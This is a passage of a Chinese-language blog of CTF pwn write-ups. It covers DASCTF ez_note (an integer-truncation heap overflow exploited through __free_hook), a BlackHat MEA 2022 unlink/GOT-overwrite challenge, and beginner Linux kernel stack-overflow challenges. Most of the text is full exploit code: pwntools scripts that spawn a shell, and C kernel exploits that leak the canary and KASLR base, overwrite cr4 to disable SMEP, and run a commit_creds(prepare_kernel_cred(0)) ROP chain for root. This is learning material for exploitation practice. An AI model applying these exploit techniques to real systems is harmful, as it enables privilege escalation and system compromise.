<p><strong>目前为止看到这题有两种思路，一是爆破堆地址，将tcache struct申请出来，这样就可以控制tcache counts为7，从而将chunk放到unsorted bin。但是因为stdout肯定也需要爆破，所以一共是两次爆破，成功率较低。</strong></p>
<p><strong>另一种更好的思路仅能在这个版本使用，就是直接在tcache bin中申请三次chunk，将counts变成-1，这样这个tcache bin就不会再被使用，chunk会被free到unsorted bin</strong></p>
<h3 id="DASCTF-X-CBCTF-2022｜-九月挑战赛——ez-note"><a href="#DASCTF-X-CBCTF-2022｜-九月挑战赛——ez-note" class="headerlink" title="DASCTF X CBCTF 2022｜ 九月挑战赛——ez_note"></a>DASCTF X CBCTF 2022｜ 九月挑战赛——ez_note</h3><p>比赛做这题时愣是没审出洞来，赛后看wp才发现忽略了这种类型长度不同导致的问题</p>
<p>这题的漏洞在add函数里</p>
<img src="/2022/06/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ez_note-1.jpg" class>

<img src="/2022/06/10/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ez_note-2.jpg" class>

<p>其中<code>ReadLong</code>函数读<code>0xA</code>个字节，然后<code>atol</code>返回，并且保存<code>Size</code>的数组是<code>QWORD</code>类型的，但是在malloc和判断输入的size的时候却是截取成int类型，所以这里存在判断size的绕过和堆溢出，版本是2.31的所以后面就很简单了。</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(<span class="number">0x100000000</span> + size))</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(content) &lt; size:</span><br><span class="line">		p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line">		</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x501</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Note content:&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7efcc1570be0</span> - <span class="number">0x7efcc1385000</span>)</span><br><span class="line">free_hook = libc_base + (<span class="number">0x7f6e5eb9ab28</span> - <span class="number">0x7f6e5e9ac000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7f6e5ea01410</span> - <span class="number">0x7f6e5e9ac000</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0xf8</span>+p64(<span class="number">0x101</span>)+p64(free_hook))</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="BlackHat-MEA-CTF-Qualification-2022"><a href="#BlackHat-MEA-CTF-Qualification-2022" class="headerlink" title="BlackHat MEA CTF Qualification 2022"></a>BlackHat MEA CTF Qualification 2022</h3><h5 id="版本：glibc-2-27-2"><a href="#版本：glibc-2-27-2" class="headerlink" title="版本：glibc-2.27"></a>版本：glibc-2.27</h5><h5 id="漏洞：UAF-3"><a href="#漏洞：UAF-3" class="headerlink" title="漏洞：UAF"></a>漏洞：UAF</h5><h5 id="考点：unlink"><a href="#考点：unlink" class="headerlink" title="考点：unlink"></a>考点：unlink</h5><h5 id="菜单：add、edit、delete"><a href="#菜单：add、edit、delete" class="headerlink" title="菜单：add、edit、delete"></a>菜单：add、edit、delete</h5><h5 id="限制：申请的堆要大于0x100，最多五个堆指针，只有calloc"><a href="#限制：申请的堆要大于0x100，最多五个堆指针，只有calloc" class="headerlink" title="限制：申请的堆要大于0x100，最多五个堆指针，只有calloc"></a>限制：申请的堆要大于0x100，最多五个堆指针，只有calloc</h5><h5 id="保护：没开pie，got表可改"><a href="#保护：没开pie，got表可改" class="headerlink" title="保护：没开pie，got表可改"></a>保护：没开pie，got表可改</h5><p>这题在add时会在bss段上保存三个东西：堆指针、申请的size、一个标志用来检测是否被delete过。</p>
<p>在edit时会根据对应位置是否有堆指针来决定能否edit，但在delete和add时会根据标志位来决定是否delete那个指针/在那个地址上add，简单点说就是不改变标志位的情况下一个堆指针最多被free一次，且可以被后面add的指针盖掉。</p>
<p><strong>其实看到PIE没关和got表可改时最先想到的应该是unlink</strong>，也就是先想到这题没开的保护会导致什么攻击方法可以被使用，而不是看到calloc就先往tcache stashing unlink attack这边靠，而且tcache stashing unlink attack应用的一般都是较高版本的libc</p>
<p>因为这题可以把chunk放到unsorted bin，且有个UAF，所以可以直接构造堆重叠（把大chunk放到unsorted bin，然后从里面割走几个小chunk），然后edit大chunk来在小chunk中构造unlink，后面的就很简单了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&quot;:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">check = <span class="number">0x4040E0</span></span><br><span class="line">heap = <span class="number">0x0404100</span></span><br><span class="line">size = <span class="number">0x04040C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x200</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">	add(<span class="number">0x300</span>)</span><br><span class="line">	free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x404100</span></span><br><span class="line">add(<span class="number">0x1f0</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f0</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f0</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x600</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x500</span>) <span class="comment">#padding</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x200</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x300</span>) <span class="comment">#1</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(ptr-<span class="number">0x18</span>+<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>+<span class="number">0x18</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x200</span>) + p64(<span class="number">0x310</span>)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line">free(<span class="number">1</span>) <span class="comment">#unlink</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>])*<span class="number">3</span> + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x04010D0</span>))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7f433cfa4680</span> - <span class="number">0x00007f433cf64000</span>)</span><br><span class="line">system = libc_base + (<span class="number">0x7f433cfb3440</span> - <span class="number">0x00007f433cf64000</span>)</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h1><h3 id="入门题level1"><a href="#入门题level1" class="headerlink" title="入门题level1"></a>入门题level1</h3><p><strong>保护</strong>：无</p>
<p><strong>驱动</strong>：<code>copy_from_user</code>，栈溢出</p>
<p>最简单的入门</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">	    <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">	    <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">	    <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">	    <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">	    );</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810b99d0</span>,prepare_kernel_cred = <span class="number">0xffffffff810b9d80</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (!fd)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ERR&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0x11</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff8100631d</span>;<span class="comment">//pop_rdi</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = prepare_kernel_cred;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff810790a6</span>;<span class="comment">//xor esi, esi; ret; </span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff814d6c3f</span>;<span class="comment">//mov rdi, rax; ja 0x6d6c2d; pop rbp; ret;</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = commit_creds;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81070834</span>;<span class="comment">//swapgs; pop rbp; ret;</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81036a5b</span>;<span class="comment">//iretq; pop rbp; ret;</span></span><br><span class="line">	rop[i++] = (<span class="keyword">size_t</span>)shell;</span><br><span class="line">	rop[i++] = user_cs;</span><br><span class="line">	rop[i++] = user_rflags;</span><br><span class="line">	rop[i++] = user_sp;</span><br><span class="line">	rop[i++] = user_ss;</span><br><span class="line">	getchar();</span><br><span class="line">	ioctl(fd,<span class="number">0x6001</span>,rop);	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入门题level2"><a href="#入门题level2" class="headerlink" title="入门题level2"></a>入门题level2</h3><p><strong>保护</strong>：开了kaslr、smep、smap、canary</p>
<p><strong>驱动</strong>：<code>copy_to_user</code>、<code>copy_from_user</code>，前者用来泄漏canary和kernel地址，后者触发栈溢出。</p>
<p><strong>思路</strong>：常规的泄漏地址和栈溢出，因为开了smep所以需要修改<code>cr4</code>寄存器（第20位为1说明开了smep），一般用如下rop链来改cr4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rdi;ret;</span><br><span class="line">0x6f0</span><br><span class="line">mov cr4,rdi;</span><br></pre></td></tr></table></figure>

<p>做这题时找不到<code>mov rdi, rax;ret;</code>这样的gadget，所以换了个别扭一点的，看到别的poc直接写函数指针来调用<code>commit_creds(prepare_kernel_cred(0))</code>，这种方法应该更好，省去了找一些gadget的时间。</p>
<p><strong>此外</strong>：做这题时发现断不了函数名（还不知道为什么），这时可以把kaslr关了，直接用地址来断：</p>
<ol>
<li><p>找驱动基址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ # lsmod</span><br><span class="line">baby 16384 0 - Live 0xffffffffc0002000 (POE)</span><br></pre></td></tr></table></figure></li>
<li><p>在ida里设置基址：<code>edit-&gt;segments-&gt;rebase program</code>（或者打断点时直接自己加偏移）</p>
</li>
</ol>
<p>然后就可以断地址调试了;</p>
<ol>
<li>gdb打好断点之后remote上去，直接c</li>
<li>驱动里运行poc即可</li>
</ol>
<p>poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">	    <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">	    <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">	    <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">	    <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">	    );</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//0xffffffff814d6c3f: mov rdi, rax; ja 0x6d6c2d; pop rbp; ret; </span></span><br><span class="line"><span class="comment">//0xffffffff810790a6: xor esi, esi; ret; </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	save_status();</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">size_t</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	ioctl(fd,<span class="number">0x6002</span>,buf);</span><br><span class="line">	<span class="keyword">size_t</span> offset = buf[<span class="number">18</span>]<span class="number">-0x2b8cc8</span><span class="number">-0xffffffff81000000</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;kernel_addr = %llx,canary = %llx,and ASLR offset = %llx&quot;</span>,buf[<span class="number">18</span>],buf[<span class="number">13</span>],offset);</span><br><span class="line">	<span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810b9d80</span>+offset,commit_creds = <span class="number">0xffffffff810b99d0</span> + offset;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">size_t</span> rop[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0x10</span>;</span><br><span class="line">	rop[i++] = buf[<span class="number">13</span>];</span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff8100631d</span>+offset;<span class="comment">//pop rdi; ret;</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = prepare_kernel_cred;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff810790a6</span>+offset;<span class="comment">//xor esi, esi; ret; </span></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff814d6c3f</span>+offset;<span class="comment">//mov rdi, rax; ja 0x6d6c2d; pop rbp; ret; </span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">	rop[i++] = <span class="number">0xffffffff8100631d</span>+offset;<span class="comment">//pop rdi; ret;</span></span><br><span class="line">	rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81020300</span>+offset;<span class="comment">//mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81070834</span>+offset;<span class="comment">//swapgs; pop rbp; ret;</span></span><br><span class="line">	rop[i++] = <span class="number">0</span>;</span><br><span class="line">	rop[i++] = <span class="number">0xffffffff81036a5b</span>+offset;<span class="comment">//iretq; pop rbp; ret;</span></span><br><span class="line"></span><br><span class="line">	rop[i++] = (<span class="keyword">size_t</span>)shell;</span><br><span class="line">	rop[i++] = user_cs;</span><br><span class="line">	rop[i++] = user_rflags;</span><br><span class="line">	rop[i++] = user_sp;</span><br><span class="line">	rop[i++] = user_ss;</span><br><span class="line">	getchar();</span><br><span class="line">	ioctl(fd,<span class="number">0x6001</span>,rop);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="入门题level3"><a href="#入门题level3" class="headerlink" title="入门题level3"></a>入门题level3</h3><p>通过ioctl调用下面这个函数，</p>
